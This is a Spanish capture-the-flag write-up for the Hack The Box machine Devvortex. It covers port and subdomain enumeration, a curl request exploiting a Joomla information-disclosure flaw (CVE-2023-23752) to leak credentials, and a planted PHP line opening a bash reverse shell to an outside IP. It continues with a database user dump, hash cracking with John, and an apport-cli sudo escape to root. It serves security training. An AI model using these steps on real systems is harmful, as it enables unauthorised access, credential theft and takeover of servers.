---
description: https://app.hackthebox.com/machines/Devvortex
---

# 游릴 HTB - Devvortex

<figure><img src="../../.gitbook/assets/Devvortex.png" alt=""><figcaption></figcaption></figure>

## Informaci칩n General

* **Nombre de la M치quina:  Devvortex**
* **IP de la M치quina:**  10.10.11.242
* **Sistema Operativo: Linux**
* **Dificultad: Easy**
* **Fecha de Publicaci칩n:  25 nov 2023**



***

### **Enumeration**

#### **Establecer el objetivo**

Primero, establecemos el objetivo utilizando el comando `settarget` con la direcci칩n IP de la m치quina objetivo:

```bash
settarget 10.10.11.242
```

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

#### **Ping de reconocimiento**

Realizamos un ping a la m치quina objetivo para verificar la conectividad y obtener informaci칩n sobre la ruta utilizando la opci칩n `-R` para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.242 -R
```

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

#### **Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la m치quina objetivo. Utilizamos las opciones `-p-` para escanear todos los puertos, `--open` para mostrar solo los puertos abiertos, `-sS` para un escaneo de tipo TCP SYN, `--min-rate 5000` para establecer la velocidad m칤nima de paquetes y `-vvv` para un nivel de verbosidad alto. Adem치s, utilizamos `-n` para desactivar la resoluci칩n de DNS, `-Pn` para no realizar el escaneo de ping, y `-oG allPorts` para guardar la salida en un archivo con formato Greppable:

{% code overflow="wrap" %}
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv  -n -Pn 10.10.11.242 -oG allPorts
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

#### **Escaneo detallado con Nmap**

Posteriormente, realizamos un escaneo m치s detallado de los puertos identificados utilizando la opci칩n `-sCV` para detecci칩n de versiones y scripts de enumeraci칩n de servicios. Espec칤ficamente, indicamos los puertos a escanear con `-p __PORTS__` (reemplazando `__PORTS__` con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre `targeted`:

```bash
sudo nmap -sCV -p22,80 10.10.11.242 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

```
cat targeted -l java
```

Para a침adir la entrada "10.10.11.242 devvortex.htb" al archivo `/etc/hosts`, puedes usar el siguiente comando en la terminal:

```bash
echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

Este comando a침ade la direcci칩n IP `10.10.11.242` asociada al nombre de host `devvortex.htb` al archivo `/etc/hosts` de tu sistema.

Para realizar un descubrimiento de directorios en un sitio web utilizando Gobuster, puedes utilizar el siguiente comando:

{% code overflow="wrap" %}
```bash
gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50
```
{% endcode %}

Pero despu칠s de un rato nos damos cuenta que no encontramos nada util, por lo que continuamos buscando subdominios:

{% code overflow="wrap" %}
```bash
gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

Agregamos la nueva ruta al hosts...

```bash
echo "10.10.11.242 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

Y gracias al robots.txt sabemos que es Joomla

<figure><img src="../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

### Exploitation

Buscamos en internet y nos encontramos que podr칤a ser vulnerable al  **CVE-2023-23752 (**[**https://www.exploit-db.com/exploits/51334**](https://www.exploit-db.com/exploits/51334)**)**

{% code overflow="wrap" %}
```bash
curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq .
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (98).png" alt=""><figcaption><p>Ingresando con credenciales obtenidas</p></figcaption></figure>

Ahora que estamos dentro, lo que buscamos es lograr ejecutar una reverse shell editando algun archivo con el editor de Joomla.

{% code overflow="wrap" %}
```bash
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.80/8080 0>&1'");
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

Luego ejecutamos /administrator/atum/index.php mientras tenemos nc a la escucha...

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

Podemos mejorar la UX de nuestra shell:

```bash
script /dev/null -c /bin/bash 
stty raw -echo; fg
export TERM=xterm
```

Descubrimos que las credenciales para ingresar a la base de datos son las mismas por lo que nos ponemos a curosear:

```bash
 mysql -u lewis -p
 Password: P4n*****r3c0n##
```

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

```sql
show databases;
use joomla;
select * from sd4fg_users;
```

<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

Intentamos crackear con John... descubriendo la contrase침a (teq\*\*\*\*\*\*cho)

{% code overflow="wrap" %}
```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
{% endcode %}

### Privilege Escalation

Ya dentro de nuestra shell, ejecutamos como siempre `sudo -l`

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

Esto quiere que podria correr `/usr/bin/apport-cli` con sudo, buscando en internet veo que es un CVE ([https://github.com/diego-tella/CVE-2023-1326-PoC](https://github.com/diego-tella/CVE-2023-1326-PoC)).

<figure><img src="../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

Al parecer al abrir un reporte podemos bypassear y llegar a ser root. Me doy cuenta que en mi caso no tengo ning칰n reporte por lo que debo primero crear uno:

<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

Luego vemos el reporte y inyectamos nuestro  "!/bin/bash" para byppasear.

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (219).png" alt=""><figcaption></figcaption></figure>
